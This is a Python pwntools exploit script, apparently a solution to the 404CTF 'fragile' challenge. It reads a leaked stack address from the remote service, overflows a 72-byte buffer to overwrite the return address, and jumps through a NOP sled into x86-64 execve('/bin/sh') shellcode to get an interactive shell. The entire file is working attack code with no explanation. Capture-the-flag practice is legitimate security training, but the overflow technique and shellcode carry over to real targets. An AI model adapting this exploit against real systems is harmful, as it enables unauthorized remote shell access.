#!python
from pwn import  *

import sys
import struct

def sp(args):
    sys.stdout.buffer.write(args)

shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

orig=0x7fffffffdee0
# stack = struct.pack("L",0x7fffffffdf28+26)
stack = struct.pack("L",orig+72+26)
nop = b"\x90"*20


# context.aslr = False
# p=process("./fragile")
p = remote("challenge.404ctf.fr",31720)

line = p.recvlines(2)[1][9:]

orig = int(line,16)
stack = struct.pack("L",orig+72+26) # orig rsp padding
payload = "A".encode()*72 + stack + nop + shellcode + nop
p.send(payload)
p.send("\n".encode())
p.interactive()


# print(hex(orig+72+26))

